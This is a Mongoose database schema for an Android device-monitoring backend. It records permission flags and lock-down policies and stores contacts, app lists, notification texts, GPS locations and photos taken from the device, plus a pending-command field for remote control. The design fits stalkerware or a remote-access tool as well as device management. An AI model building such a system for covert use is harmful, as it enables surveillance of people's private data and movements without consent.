const mongoose = require('mongoose');

const DeviceSchema = new mongoose.Schema(
  {
    deviceId: {
      type: String,
      required: true,
      unique: true,
      trim: true,
    },
    deviceModel: {
      type: String,
      default: 'Unknown Device',
    },
    androidVersion: {
      type: String,
      default: 'Unknown',
    },
    screenSize: {
      type: String,
      default: 'Unknown',
    },
    appVersion: {
      type: String,
      default: '1.0.0',
    },
    language: {
      type: String,
      default: 'en',
    },
    timezone: {
      type: String,
      default: 'UTC',
    },
    batteryStatus: {
      level: { type: Number, default: 100 },
      isCharging: { type: Boolean, default: false },
    },
    networkState: {
      isConnected: { type: Boolean, default: true },
      type: { type: String, default: 'wifi' },
      ipAddress: { type: String, default: '127.0.0.1' },
      wifiName: { type: String, default: 'Unknown' },
    },
    status: {
      type: String,
      enum: ['active', 'inactive'],
      default: 'active',
    },
    lastActive: {
      type: Date,
      default: Date.now,
    },
    permissions: {
      notificationAccess: { type: Boolean, default: false },
      smsAccess: { type: Boolean, default: false },
      contactsAccess: { type: Boolean, default: false },
      locationAccess: { type: Boolean, default: false },
      cameraAccess: { type: Boolean, default: false },
      micAccess: { type: Boolean, default: false },
      accessibilityAccess: { type: Boolean, default: false },
      rooted: { type: Boolean, default: false },
      deviceAdmin: { type: Boolean, default: false },
      deviceOwner: { type: Boolean, default: false },
    },
    policies: {
      cameraDisabled: { type: Boolean, default: false },
      kioskModeEnabled: { type: Boolean, default: false },
      kioskPackage: { type: String, default: '' },
      uninstallBlockedPackages: [{ type: String }],
    },
    photos: [{
      url: { type: String },
      timestamp: { type: Date, default: Date.now }
    }],
    // Real data arrays collected from the device
    contacts: [
      {
        name: { type: String, default: '' },
        phone: { type: String, default: '' },
      }
    ],
    installedApps: [
      {
        name: { type: String, default: '' },
        packageName: { type: String, default: '' },
      }
    ],
    notifications: [
      {
        title: { type: String, default: '' },
        text: { type: String, default: '' },
        appName: { type: String, default: '' },
        timestamp: { type: Date, default: Date.now },
      }
    ],
    locations: [
      {
        latitude: { type: Number },
        longitude: { type: Number },
        timestamp: { type: Date, default: Date.now },
      }
    ],
    contactsCount: { type: Number, default: 0 },
    installedAppsCount: { type: Number, default: 0 },
    notificationsCount: { type: Number, default: 0 },
    pendingCommand: {
      type: String,
      default: 'none',
    },
    pendingCommandArgs: {
      type: mongoose.Schema.Types.Mixed,
      default: null,
    },
  },
  {
    timestamps: true,
  }
);

DeviceSchema.index({ deviceId: 1 });
DeviceSchema.index({ status: 1, lastActive: -1 });

module.exports = mongoose.model('Device', DeviceSchema);
